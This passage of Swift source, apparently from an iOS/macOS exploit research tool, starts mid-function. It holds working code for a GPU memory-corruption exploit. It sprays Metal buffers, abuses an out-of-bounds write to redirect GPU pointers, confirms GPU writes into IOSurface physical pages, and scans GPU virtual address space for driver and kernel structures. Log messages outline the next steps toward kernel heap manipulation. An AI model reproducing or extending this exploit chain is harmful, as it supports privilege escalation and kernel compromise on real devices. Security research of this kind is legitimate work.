        // Spray: find lo/hi adjacent pair for OOB write into hi[0]
        var loRef: MTLBuffer?
        var nextGPUVA: UInt64 = 0
        var keepAlives: [any MTLBuffer] = []
        for _ in 0..<2048 {
            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
            if let prev = keepAlives.last, a.gpuAddress == prev.gpuAddress + UInt64(BUF_LEN) {
                loRef = prev; nextGPUVA = a.gpuAddress; break
            }
            keepAlives.append(a)
        }
        guard let lo = loRef else { step("✗ spray miss"); completion(); return }
        step("✓ lo=0x\(String(lo.gpuAddress, radix: 16)) next=0x\(String(nextGPUVA, radix: 16))")
        let loPtr = lo.contents().assumingMemoryBound(to: UInt8.self)

        guard let hi = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
            step("✗ hi alloc"); completion(); return
        }
        step("hi gpuVA=0x\(String(hi.gpuAddress, radix: 16)) \(hi.gpuAddress == nextGPUVA ? "✓" : "⚠ MISMATCH")")

        func oobWrite8(_ off: Int, _ val: UInt64) {
            for bi in 0..<8 { loPtr[BUF_LEN+off+bi] = UInt8((val >> (bi*8)) & 0xFF) }
        }

        // OOB adjacency check
        oobWrite8(0, 0xAAAA_BBBB_CCCC_DDDD)
        let chk = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
        step("OOB reach: \(chk == 0xAAAA_BBBB_CCCC_DDDD ? "✓ ADJACENT" : "⚠ NOT ADJACENT")")

        // GPU write kernel (same writeProbe as stage9)
        let kernSrc = """
        #include <metal_stdlib>
        using namespace metal;
        struct AB { device float4* buf; };
        kernel void writeProbe(device AB*     ab  [[buffer(0)]],
                               device float4* src [[buffer(1)]]) {
            ab->buf[0] = src[0];
        }
        """
        guard let lib = try? device.makeLibrary(source: kernSrc, options: nil),
              let fn  = lib.makeFunction(name: "writeProbe"),
              let pso = try? device.makeComputePipelineState(function: fn) else {
            step("✗ writeProbe PSO"); completion(); return
        }

        // ── OOB hi[0] = surfVA → GPU writes 0xBB to IOSurface physical pages ──
        step("── OOB lo→hi[0]=surfVA → GPU writes srcBuf(0xBB)→IOSurface backing ──")
        oobWrite8(0, surfVA)
        let hiGot = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
        step("  hi[0]=0x\(String(hiGot, radix: 16)) \(hiGot == surfVA ? "✓ OOB hit" : "⚠ OOB miss")")

        guard let q   = device.makeCommandQueue(),
              let cb  = q.makeCommandBuffer(),
              let enc = cb.makeComputeCommandEncoder() else {
            step("✗ encoder"); completion(); return
        }
        enc.setComputePipelineState(pso)
        enc.setBuffer(hi,     offset: 0, index: 0)
        enc.setBuffer(srcBuf, offset: 0, index: 1)
        enc.useResource(surfBuf, usage: .write)
        enc.useResource(srcBuf,  usage: .read)
        let t = MTLSize(width: 1, height: 1, depth: 1)
        enc.dispatchThreads(t, threadsPerThreadgroup: t)
        enc.endEncoding()
        cb.commit(); cb.waitUntilCompleted()

        if let err = cb.error as NSError? {
            step("  FAULT code=\(err.code) \(err.localizedDescription.prefix(100))")
            step("  AGX rejected GPU write to IOSurface VA — check useResource registration")
            completion(); return
        }

        // CPU reads IOSurface backing via surf.baseAddress
        // If GPU wrote to surfVA (same physical pages), we see 0xBB here
        surf.lock(options: .readOnly, seed: nil)
        let surfResult = surf.baseAddress.assumingMemoryBound(to: UInt64.self)[0]
        let surfBufResult = surfBuf.contents().assumingMemoryBound(to: UInt64.self)[0]
        surf.unlock(options: .readOnly, seed: nil)

        step("  surf.baseAddress[0]   =0x\(String(surfResult,    radix: 16))")
        step("  surfBuf.contents()[0] =0x\(String(surfBufResult, radix: 16))")

        if surfResult == 0xBBBBBBBBBBBBBBBB {
            step("  ★★★ GPU WRITE → IOSurface CONFIRMED")
            step("  ★ GPU wrote 0xBB to IOSurface physical pages — CPU and kernel see the same mutation")
            step("  ★ BRIDGE: user GPU write primitive → kernel-shared physical memory")
            step("  NEXT: heap feng shui — allocate many IOSurfaces, free alternates,")
            step("         allocate target kernel struct adjacent, overflow past IOSurface end")
        } else if surfResult == 0x1111111111111111 {
            step("  ⚠ surf still 0x11 — GPU write landed somewhere else or was blocked")
            step("  surfBuf.contents()[0]=0x\(String(surfBufResult, radix: 16)) (check if write hit no-copy buffer instead)")
        } else {
            step("  ? surfResult=0x\(String(surfResult, radix: 16)) (unexpected partial write?)")
        }

        step("── IOSurface GPU Write complete ──")
        completion()
    }
}

// ── runGPUVAScan ──────────────────────────────────────────────────────────────
// Sweep GPU VA space with the read redirect primitive to locate Metal driver /
// kernel-mapped regions not visible from userspace.
//
// Strategy: 64-thread dispatch per chunk, each thread reads from a different
// candidate GPU VA via OOB-corrupted Probe array in hi.  AGX safe-return means
// unmapped VAs return 0 silently; non-zero => something is mapped there.
//
// Scanned ranges (covering ~130GB with coarse granularity):
//   Low:       0x000000000 – 0x080000000   (2 GB,  512 KB step)
//   PreUser:   0x100000000 – 0x1400000000  (15 GB,    4 MB step)
//   PostUser:  0x1700000000– 0x1b00000000  (16 GB,    4 MB step)
//   High:      0x4000000000– 0x4400000000  (16 GB,    4 MB step)
//
// Non-zero hits logged as: HIT VA=0x… val=0x… — these are candidates for
// Metal command-buffer descriptors, PSO caches, IOGPUFamily internal structs,
// AGX firmware IPC region.  Follow-up: narrow with 4 KB step scan around hit.
// ─────────────────────────────────────────────────────────────────────────────
func runGPUVAScan(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        func step(_ s: String) { log.append(s) }
        step("── GPU VA Scanner ──")
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }

        let BUF_LEN  = 4096
        let NTHREADS = 64  // probes per dispatch

        // Spray → lo/hi pair
        var loRef: MTLBuffer?
        var nextGPUVA: UInt64 = 0
        var keepAlives: [any MTLBuffer] = []
        for _ in 0..<2048 {
            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
            if let prev = keepAlives.last, a.gpuAddress == prev.gpuAddress + UInt64(BUF_LEN) {
                loRef = prev; nextGPUVA = a.gpuAddress; break
            }
            keepAlives.append(a)
        }
        guard let lo = loRef else { step("✗ spray miss"); completion(); return }
        let loPtr = lo.contents().assumingMemoryBound(to: UInt8.self)
        step("✓ lo=0x\(String(lo.gpuAddress, radix: 16))")

        guard let hi  = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
              let out = device.makeBuffer(length: NTHREADS * 8, options: .storageModeShared) else {
            step("✗ hi/out alloc"); completion(); return
        }
        step("hi=0x\(String(hi.gpuAddress, radix: 16)) \(hi.gpuAddress == nextGPUVA ? "✓" : "⚠")")

        // Write candidate VA into hi[idx].buf (8 bytes at offset idx*8 past lo end)
        func oobWriteVA(_ idx: Int, _ va: UInt64) {
            let off = idx * 8
            for bi in 0..<8 { loPtr[BUF_LEN+off+bi] = UInt8((va >> (bi*8)) & 0xFF) }
        }

        // Kernel: hi is treated as array of Probe{device ulong* buf}
        // Thread tid reads from hi[tid].buf[0] and writes result to out[tid]
        let kernSrc = """
        #include <metal_stdlib>
        using namespace metal;
        struct Probe { device ulong* buf; };
        kernel void multiScan(device Probe* probes [[buffer(0)]],
                              device ulong* out    [[buffer(1)]],
                              uint tid [[thread_position_in_grid]]) {
            out[tid] = probes[tid].buf[0];
        }
        """
        guard let lib = try? device.makeLibrary(source: kernSrc, options: nil),
              let fn  = lib.makeFunction(name: "multiScan"),
              let pso = try? device.makeComputePipelineState(function: fn) else {
            step("✗ multiScan PSO"); completion(); return
        }
        step("✓ multiScan PSO ready")

        // Helper: fire one dispatch and return out[0]
        func singleProbe(useRes: MTLBuffer? = nil) -> UInt64 {
            out.contents().initializeMemory(as: UInt64.self, repeating: 0xEEEE, count: NTHREADS)
            guard let q   = device.makeCommandQueue(),
                  let cb  = q.makeCommandBuffer(),
                  let enc = cb.makeComputeCommandEncoder() else { return 0xDEAD }
            enc.setComputePipelineState(pso)
            enc.setBuffer(hi,  offset: 0, index: 0)
            enc.setBuffer(out, offset: 0, index: 1)
            if let r = useRes { enc.useResource(r, usage: .read) }
            let sz = MTLSize(width: 1, height: 1, depth: 1)
            enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
            enc.endEncoding()
            cb.commit(); cb.waitUntilCompleted()
            return out.contents().assumingMemoryBound(to: UInt64.self)[0]
        }

        // ── Phase 0: useResource requirement test ──────────────────────────────
        // hi[0].buf = hi.gpuAddress (self-referential: GPU reads hi's own first field)
        // Without useResource(hi) for the indirect read, val == 0 if useResource required
        // Expected non-zero value if GPU can read it = hi.gpuAddress as UInt64
        step("── phase 0: useResource requirement test ──")
        oobWriteVA(0, hi.gpuAddress)   // hi[0].buf = &hi (GPU reads from hi's own VA)
        let noUR  = singleProbe(useRes: nil)      // no useResource on hi-as-scan-target
        let withUR = singleProbe(useRes: hi)      // with useResource(hi, .read)
        step("  hi.gpuAddress=0x\(String(hi.gpuAddress, radix: 16))")
        step("  without useResource → 0x\(String(noUR,   radix: 16))  (expect 0 if required)")
        step("  with    useResource → 0x\(String(withUR, radix: 16))  (expect hi.gpuAddress=0x\(String(hi.gpuAddress, radix: 16)))")
        let useResourceRequired = (noUR == 0) && (withUR == hi.gpuAddress)
        step("  useResource required for mapped reads: \(useResourceRequired)")

        // ── Phase 1: full-range scan (no useResource on targets) ──────────────
        // ── Phase 1: focused upward scan from the spray base ─────────────────
        // Previous scan went BELOW 0x1500000000 (wrong direction).
        // Driver PSO / command-queue allocations come from the SAME heap and land
        // ABOVE our user spray (which starts at lo.gpuAddress = 0x1500000000).
        // Three passes: fine (4KB) just above hi, medium (64KB) further up, coarse (1MB) far.
        let sprayBase = lo.gpuAddress
        let ranges: [(base: UInt64, step: UInt64, dispatches: Int, label: String)] = [
            // fine: immediately above spray — catches PSO shader binary, cmd-queue allocs
            (sprayBase + 0x2000,   0x1000,  64,  "fine    +8KB–+264KB above spray"),
            // medium: farther above spray — catches larger driver allocations
            (sprayBase + 0x100000, 0x10000, 128, "medium  +1MB–+129MB above spray"),
            // upper: well above user range — Metal framework private heap
            (sprayBase + 0x8000000, 0x40000, 128, "upper  +128MB–+640MB above spray"),
            // low: 0x0–4GB — AGX firmware IPC / shared memory
            (0x0, 0x1000, 256, "low     0x0–1MB AGX firmware"),
        ]

        var totalHits = 0
        var hitVAs: [UInt64] = []

        for rng in ranges {
            step("── \(rng.label) ──")
            for d in 0..<rng.dispatches {
                let base = rng.base + UInt64(d) * UInt64(NTHREADS) * rng.step
                for t in 0..<NTHREADS { oobWriteVA(t, base + UInt64(t) * rng.step) }
                out.contents().initializeMemory(as: UInt64.self, repeating: 0, count: NTHREADS)
                guard let q   = device.makeCommandQueue(),
                      let cb  = q.makeCommandBuffer(),
                      let enc = cb.makeComputeCommandEncoder() else { continue }
                enc.setComputePipelineState(pso)
                enc.setBuffer(hi,  offset: 0, index: 0)
                enc.setBuffer(out, offset: 0, index: 1)
                let sz = MTLSize(width: NTHREADS, height: 1, depth: 1)
                enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
                enc.endEncoding()
                cb.commit(); cb.waitUntilCompleted()
                if cb.error != nil { continue }
                let outPtr = out.contents().assumingMemoryBound(to: UInt64.self)
                for t in 0..<NTHREADS {
                    let val = outPtr[t]
                    if val != 0 {
                        let va = base + UInt64(t) * rng.step
                        step("  ★ HIT VA=0x\(String(va, radix: 16)) val=0x\(String(val, radix: 16))")
                        hitVAs.append(va); totalHits += 1
                    }
                }
            }
        }

        // ── Phase 2: 4KB re-scan around each hit ──────────────────────────────
        if !hitVAs.isEmpty {
            step("── phase 2: 4KB fine-scan ±256KB around each hit ──")
            for hitVA in hitVAs.prefix(8) {
                let hitBase = hitVA > 0x40000 ? hitVA - 0x40000 : 0
                for d in 0..<8 {
                    let base = hitBase + UInt64(d) * UInt64(NTHREADS) * 0x1000
                    for t in 0..<NTHREADS { oobWriteVA(t, base + UInt64(t) * 0x1000) }
                    out.contents().initializeMemory(as: UInt64.self, repeating: 0, count: NTHREADS)
                    guard let q   = device.makeCommandQueue(),
                          let cb  = q.makeCommandBuffer(),
                          let enc = cb.makeComputeCommandEncoder() else { continue }
                    enc.setComputePipelineState(pso)
                    enc.setBuffer(hi,  offset: 0, index: 0)
                    enc.setBuffer(out, offset: 0, index: 1)
                    let sz = MTLSize(width: NTHREADS, height: 1, depth: 1)
                    enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
                    enc.endEncoding()
                    cb.commit(); cb.waitUntilCompleted()
                    if cb.error != nil { continue }
                    let outPtr = out.contents().assumingMemoryBound(to: UInt64.self)
                    for t in 0..<NTHREADS {
                        let val = outPtr[t]
                        if val != 0 {
                            let va = base + UInt64(t) * 0x1000
                            step("  [refine] VA=0x\(String(va, radix:16)) val=0x\(String(val, radix:16))")
                        }
                    }
                }
            }
        }

        if totalHits == 0 {
            step("── scan complete: 0 hits ──")
            step("  driver allocs may use storageModePrivate within process GPU VA space")
            step("  or Metal heap is fully isolated from standard allocator range")
            step("  PIVOT: IOSurface plane descriptor path — check kern-trusted data in backing pages")
            step("  try: dump lo.contents() and first 512 bytes above hi for driver data patterns")
        } else {
            step("── scan complete: \(totalHits) hit(s) ──")
            step("  ★ non-zero VAs = Metal driver / kernel struct candidates")
            step("  cross-ref with known GPU struct signatures to identify what's there")
        }
        step("── GPU VA Scanner complete ──")
        completion()
    }
}
